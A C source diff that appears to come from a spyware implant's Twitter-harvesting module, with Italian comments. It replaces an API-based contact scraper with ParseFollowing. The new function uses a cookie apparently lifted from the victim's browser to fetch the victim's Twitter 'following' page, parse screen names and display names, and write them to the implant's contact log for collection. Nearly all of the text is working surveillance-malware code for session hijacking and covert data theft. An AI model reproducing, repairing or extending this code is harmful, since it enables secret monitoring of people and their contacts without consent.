@@ -31,129 +31,207 @@ extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
 #define TWITTER_TWEET_DISPLAY_NAME_START "data-name=\""
 #define TWITTER_TWEET_TIMESTAMP_START "data-time=\"" //"<span class=\"_timestamp js-short-timestamp js-relative-timestamp\"  data-time=\""
 #define TWITTER_TWEET_TIMESTAMP_END   "\"" //useless
+#define TWITTER_FOLLOWING_CONTACT_1 "<div class=\"ProfileCard js-actionable-user\""
+#define TWITTER_FOLLOWING_CONTACT_2 "data-screen-name=\""
 
+//DWORD ParseCategory(char *user, char *category, char *cookie, DWORD flags)
+//{
+//	DWORD ret_val;
+//	BYTE *r_buffer = NULL, *r_buffer_inner = NULL;
+//	DWORD response_len;
+//	char *parser1, *parser2, *parser_inner1, *parser_inner2;
+//	WCHAR twitter_request[256];
+//	char post_data[2048];
+//	char contact_name[256];
+//	char screen_name[256];
+//	char *id_ptr;
+//	HANDLE hfile;
+//	DWORD id_count;
+//	WCHAR *screen_name_w, *contact_name_w;
+//	char *tag1, *tag2;
+//
+//	_snwprintf_s(twitter_request, sizeof(twitter_request)/sizeof(WCHAR), _TRUNCATE, L"/1/%S/ids.json?cursor=-1&user_id=%S", category, user);
+//	ret_val = HttpSocialRequest(L"api.twitter.com", L"GET", twitter_request, 443, NULL, 0, &r_buffer, &response_len, cookie);	
+//	if (ret_val != SOCIAL_REQUEST_SUCCESS)
+//		return ret_val;
+//	
+//	parser1 = (char *)strstr((char *)r_buffer, "\"ids\":[");
+//	if (!parser1) {
+//		SAFE_FREE(r_buffer);
+//		return SOCIAL_REQUEST_BAD_COOKIE;
+//	}
+//	parser1 += strlen("\"ids\":[");
+//	parser2 = (char *)strchr((char *)parser1, ']');
+//	if (!parser2) {
+//		SAFE_FREE(r_buffer);
+//		return SOCIAL_REQUEST_BAD_COOKIE;
+//	}
+//	*parser2=0;	
+//
+//	id_ptr = parser1;
+//	LOOP {
+//		if (!id_ptr || *id_ptr==0) 
+//			break;
+//
+//		id_count = 1;
+//		LOOP {
+//			id_ptr = strstr((char *)id_ptr, ",");
+//			if (!id_ptr)
+//				break;
+//			if (id_count == TW_ID_LIMIT) {
+//				*id_ptr=0;
+//				id_ptr++;
+//				break;
+//			}
+//			id_count++;
+//			id_ptr++;
+//		}			
+//		
+//		_snprintf_s(post_data, sizeof(post_data), _TRUNCATE, "user_id=%s", parser1);
+//		parser1 = id_ptr;
+//		
+//		ret_val = HttpSocialRequest(L"api.twitter.com", L"POST", L"/1/users/lookup.json", 443, (BYTE *)post_data, strlen(post_data), &r_buffer_inner, &response_len, cookie);	
+//		if (ret_val != SOCIAL_REQUEST_SUCCESS) {
+//			SAFE_FREE(r_buffer);
+//			return ret_val;
+//		}
+//	
+//		CheckProcessStatus();
+//
+//		// Verifica quale tag c'e' per primo
+//		parser_inner1 = strstr((char *)r_buffer_inner, TW_CONTACT_ID1);
+//		parser_inner2 = strstr((char *)r_buffer_inner, TW_CONTACT_ID2);
+//		if (!parser_inner1 || !parser_inner2) {
+//			SAFE_FREE(r_buffer);
+//			SAFE_FREE(r_buffer_inner);
+//			return SOCIAL_REQUEST_BAD_COOKIE;
+//		}
+//		if (parser_inner1 < parser_inner2) {
+//			tag1 = TW_CONTACT_ID1;
+//			tag2 = TW_CONTACT_ID2;
+//		} else {
+//			tag1 = TW_CONTACT_ID2;
+//			tag2 = TW_CONTACT_ID1;
+//		}
+//
+//		parser_inner1 = (char *)r_buffer_inner;
+//	
+//		hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
+//		LOOP {
+//			parser_inner1 = strstr(parser_inner1, tag1);
+//			if (!parser_inner1)
+//				break;
+//			parser_inner1 += strlen(tag1);
+//			parser_inner2 = strchr(parser_inner1, '\"');
+//			if (!parser_inner2)
+//				break;
+//			*parser_inner2 = NULL;
+//			_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "%s", parser_inner1);
+//			parser_inner1 = parser_inner2 + 1;
+//
+//			parser_inner1 = strstr(parser_inner1, tag2);
+//			if (!parser_inner1)
+//				break;
+//			parser_inner1 += strlen(tag2);
+//			parser_inner2 = strchr(parser_inner1, '\"');
+//			if (!parser_inner2)
+//				break;
+//			*parser_inner2 = NULL;
+//			_snprintf_s(contact_name, sizeof(contact_name), _TRUNCATE, "%s", parser_inner1);
+//			parser_inner1 = parser_inner2 + 1;
+//
+//			contact_name_w = UTF8_2_UTF16(contact_name);
+//			screen_name_w = UTF8_2_UTF16(screen_name);
+//
+//			if (tag1 != TW_CONTACT_ID1)
+//				DumpContact(hfile, CONTACT_SRC_TWITTER, screen_name_w, NULL, NULL, NULL, NULL, NULL, NULL, NULL, contact_name_w, NULL, flags);
+//			else
+//				DumpContact(hfile, CONTACT_SRC_TWITTER, contact_name_w, NULL, NULL, NULL, NULL, NULL, NULL, NULL, screen_name_w, NULL, flags);
+//		
+//			SAFE_FREE(contact_name_w);
+//			SAFE_FREE(screen_name_w);
+//		}
+//		Log_CloseFile(hfile);
+//		SAFE_FREE(r_buffer_inner);
+//	}
+//
+//	SAFE_FREE(r_buffer);
+//	return SOCIAL_REQUEST_SUCCESS;
+//}
 
-DWORD ParseCategory(char *user, char *category, char *cookie, DWORD flags)
+DWORD ParseFollowing(char *user, char *cookie)
 {
 	DWORD ret_val;
-	BYTE *r_buffer = NULL, *r_buffer_inner = NULL;
+	BYTE *r_buffer = NULL;
 	DWORD response_len;
-	char *parser1, *parser2, *parser_inner1, *parser_inner2;
-	WCHAR twitter_request[256];
-	char post_data[2048];
-	char contact_name[256];
-	char screen_name[256];
-	char *id_ptr;
+	char *parser1, *parser2;
 	HANDLE hfile;
-	DWORD id_count;
-	WCHAR *screen_name_w, *contact_name_w;
-	char *tag1, *tag2;
-
-	_snwprintf_s(twitter_request, sizeof(twitter_request)/sizeof(WCHAR), _TRUNCATE, L"/1/%S/ids.json?cursor=-1&user_id=%S", category, user);
-	ret_val = HttpSocialRequest(L"api.twitter.com", L"GET", twitter_request, 443, NULL, 0, &r_buffer, &response_len, cookie);	
+	
+	char screen_name[256];
+	char following_contact[256];
+	
+	ret_val = HttpSocialRequest(L"twitter.com", L"GET", L"/following", 443, NULL, 0, &r_buffer, &response_len, cookie);
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
 	
-	parser1 = (char *)strstr((char *)r_buffer, "\"ids\":[");
-	if (!parser1) {
-		SAFE_FREE(r_buffer);
-		return SOCIAL_REQUEST_BAD_COOKIE;
-	}
-	parser1 += strlen("\"ids\":[");
-	parser2 = (char *)strchr((char *)parser1, ']');
-	if (!parser2) {
-		SAFE_FREE(r_buffer);
-		return SOCIAL_REQUEST_BAD_COOKIE;
-	}
-	*parser2=0;	
+	CheckProcessStatus();
 
-	id_ptr = parser1;
-	LOOP {
-		if (!id_ptr || *id_ptr==0) 
+	parser1 = (char *)r_buffer;
+	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
+	for (;;) {
+
+		/* 1] following contact
+			e.g. <div class="ProfileCard js-actionable-user"   data-screen-name="thegrugq_ebooks"
+		*/
+
+		// advance first token
+		parser1 = strstr(parser1, TWITTER_FOLLOWING_CONTACT_1);
+		if( !parser1 )
+			break;
+		
+		parser1 += strlen(TWITTER_FOLLOWING_CONTACT_1);
+
+		// advance second token
+		parser1 = strstr(parser1, TWITTER_FOLLOWING_CONTACT_2);
+		if( !parser1 )
+			break;
+		
+		parser1 += strlen(TWITTER_FOLLOWING_CONTACT_2);
+		parser2 = strchr(parser1, '"');
+
+		if( !parser2 )
 			break;
 
-		id_count = 1;
-		LOOP {
-			id_ptr = strstr((char *)id_ptr, ",");
-			if (!id_ptr)
-				break;
-			if (id_count == TW_ID_LIMIT) {
-				*id_ptr=0;
-				id_ptr++;
-				break;
-			}
-			id_count++;
-			id_ptr++;
-		}			
+		*parser2 = NULL;
+		_snprintf_s(following_contact, sizeof(following_contact), _TRUNCATE, parser1);
+		parser1 = parser2 + 1;
+
+		/* 2] screen name
+			e.g.  data-name="The real Grugq" 
+		*/
+		parser1 = strstr(parser1, TWITTER_TWEET_DISPLAY_NAME_START);
+		if( !parser1 )
+			break;
+
+		parser1 += strlen(TWITTER_TWEET_DISPLAY_NAME_START);
 		
-		_snprintf_s(post_data, sizeof(post_data), _TRUNCATE, "user_id=%s", parser1);
-		parser1 = id_ptr;
-		
-		ret_val = HttpSocialRequest(L"api.twitter.com", L"POST", L"/1/users/lookup.json", 443, (BYTE *)post_data, strlen(post_data), &r_buffer_inner, &response_len, cookie);	
-		if (ret_val != SOCIAL_REQUEST_SUCCESS) {
-			SAFE_FREE(r_buffer);
-			return ret_val;
-		}
-	
-		CheckProcessStatus();
+		parser2 = strchr( parser1, '"');
+		if( !parser2 )
+			break;
 
-		// Verifica quale tag c'e' per primo
-		parser_inner1 = strstr((char *)r_buffer_inner, TW_CONTACT_ID1);
-		parser_inner2 = strstr((char *)r_buffer_inner, TW_CONTACT_ID2);
-		if (!parser_inner1 || !parser_inner2) {
-			SAFE_FREE(r_buffer);
-			SAFE_FREE(r_buffer_inner);
-			return SOCIAL_REQUEST_BAD_COOKIE;
-		}
-		if (parser_inner1 < parser_inner2) {
-			tag1 = TW_CONTACT_ID1;
-			tag2 = TW_CONTACT_ID2;
-		} else {
-			tag1 = TW_CONTACT_ID2;
-			tag2 = TW_CONTACT_ID1;
-		}
+		*parser2 = NULL;
+		_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, parser1);
+		parser1 = parser2 + 1;
 
-		parser_inner1 = (char *)r_buffer_inner;
-	
-		hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
-		LOOP {
-			parser_inner1 = strstr(parser_inner1, tag1);
-			if (!parser_inner1)
-				break;
-			parser_inner1 += strlen(tag1);
-			parser_inner2 = strchr(parser_inner1, '\"');
-			if (!parser_inner2)
-				break;
-			*parser_inner2 = NULL;
-			_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "%s", parser_inner1);
-			parser_inner1 = parser_inner2 + 1;
+		WCHAR *screen_name_w = UTF8_2_UTF16(screen_name);
+		WCHAR *following_contact_w = UTF8_2_UTF16(following_contact);
 
-			parser_inner1 = strstr(parser_inner1, tag2);
-			if (!parser_inner1)
-				break;
-			parser_inner1 += strlen(tag2);
-			parser_inner2 = strchr(parser_inner1, '\"');
-			if (!parser_inner2)
-				break;
-			*parser_inner2 = NULL;
-			_snprintf_s(contact_name, sizeof(contact_name), _TRUNCATE, "%s", parser_inner1);
-			parser_inner1 = parser_inner2 + 1;
+		DumpContact(hfile, CONTACT_SRC_TWITTER, screen_name_w, NULL, NULL, NULL, NULL, NULL, NULL, NULL, following_contact_w, NULL, TWITTER_FOLLOWER);
 
-			contact_name_w = UTF8_2_UTF16(contact_name);
-			screen_name_w = UTF8_2_UTF16(screen_name);
-
-			if (tag1 != TW_CONTACT_ID1)
-				DumpContact(hfile, CONTACT_SRC_TWITTER, screen_name_w, NULL, NULL, NULL, NULL, NULL, NULL, NULL, contact_name_w, NULL, flags);
-			else
-				DumpContact(hfile, CONTACT_SRC_TWITTER, contact_name_w, NULL, NULL, NULL, NULL, NULL, NULL, NULL, screen_name_w, NULL, flags);
-		
-			SAFE_FREE(contact_name_w);
-			SAFE_FREE(screen_name_w);
-		}
-		Log_CloseFile(hfile);
-		SAFE_FREE(r_buffer_inner);
+		SAFE_FREE(screen_name_w);
+		SAFE_FREE(following_contact_w);
 	}
-
+	Log_CloseFile(hfile);
 	SAFE_FREE(r_buffer);
 	return SOCIAL_REQUEST_SUCCESS;
 }
@@ -220,8 +298,9 @@ DWORD HandleTwitterContacts(char *cookie)
 	SAFE_FREE(r_buffer);
 	scanned = TRUE;
 
-	ParseCategory(user, "friends", cookie, TWITTER_FRIEND);
-	return ParseCategory(user, "followers", cookie, TWITTER_FOLLOWER);
+	//ParseCategory(user, "friends", cookie, TWITTER_FRIEND);
+	//return ParseCategory(user, "followers", cookie, TWITTER_FOLLOWER);
+	return ParseFollowing(user, cookie);
 }
 
 #define TW_TWEET_BODY "\"text\":\""
@@ -263,7 +342,7 @@ DWORD ParseTweet(char *user, char *cookie)
 		4] timestamp
 	*/
 	for (;;) {
-
+		CheckProcessStatus();
 		/* 2] tweet id
 			e.g. data-tweet-id="526625177615220736"
 		*/
